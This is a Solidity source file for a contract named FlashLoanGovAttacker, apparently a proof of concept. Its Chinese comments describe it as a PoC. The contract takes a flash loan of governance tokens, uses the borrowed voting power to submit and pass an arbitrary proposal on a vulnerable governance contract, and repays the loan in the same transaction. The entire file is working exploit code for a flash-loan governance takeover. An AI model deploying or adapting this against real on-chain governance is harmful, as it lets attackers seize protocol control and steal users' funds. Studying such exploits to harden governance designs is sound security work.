// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

interface IFlashLoan {
    function flashLoan(uint256 amount, bytes data) external;
}
interface IERC20Mini {
    function transfer(address to, uint256 v) external returns (bool);
    function transferFrom(address f, address to, uint256 v) external returns (bool);
    function approve(address s, uint256 v) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}
interface IVulnGov {
    function propose(address target, uint256 value, bytes data) external returns (uint256);
    function vote(uint256 id, bool support) external;
}

contract FlashLoanGovAttacker {
    IFlashLoan public pool;
    IERC20Mini public token;
    IVulnGov  public gov;
    uint256 public lastProposalId;
    address private pendingTarget;
    bytes private pendingCallData;

    constructor(IFlashLoan _pool, IERC20Mini _token, IVulnGov _gov) public {
        pool = _pool; token = _token; gov = _gov;
    }

    /// @notice Kick off the attack: borrow `amount`, then propose+vote in callback.
    function attack(uint256 amount, address target, bytes data) external {
        pendingTarget = target;
        pendingCallData = data;
        pool.flashLoan(amount, "");
        delete pendingCallData;
        pendingTarget = address(0);
        // 在本 PoC 中，投票期可能为 0；若 >0，需要等到结束再调用 execute（由外部触发）
    }

    /// @dev Flash loan callback
    function onFlashLoan(address tokenAddr, uint256 amount, bytes data) external {
        require(msg.sender == address(pool), "only pool");
        require(tokenAddr == address(token), "token mismatch");

        data;

        // 确保手上有借来的票
        require(token.balanceOf(address(this)) >= amount, "no funds");
        address target = pendingTarget;
        require(target != address(0), "no target");
        bytes memory callData = pendingCallData;

        // 1) 发起提案
        lastProposalId = gov.propose(target, 0, callData);

        // 2) 用临时获得的票数投赞成
        gov.vote(lastProposalId, true);

        // 3) 归还闪电贷
        require(token.transfer(address(pool), amount), "repay failed");
    }
}
